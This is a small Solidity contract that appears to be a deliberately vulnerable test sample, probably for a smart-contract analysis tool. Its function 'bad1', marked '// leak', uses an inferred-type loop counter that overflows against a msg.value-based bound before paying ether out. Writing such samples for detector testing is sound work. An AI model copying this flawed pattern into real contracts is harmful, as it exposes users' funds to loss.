pragma solidity ^0.4.19;

contract Test {
    address owner = msg.sender;

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function() payable {}

    function bad1() public payable {
        if (msg.value > 0.1 ether) {
            uint256 multi = 0;
            uint256 amountToTransfer = 0;

            for (var i = 0; i < msg.value * 2; i++) {
                // leak
                multi = i * 2;

                if (multi < amountToTransfer) {
                    break;
                } else {
                    amountToTransfer = multi;
                }
            }
            msg.sender.transfer(amountToTransfer);
        }
    }
}
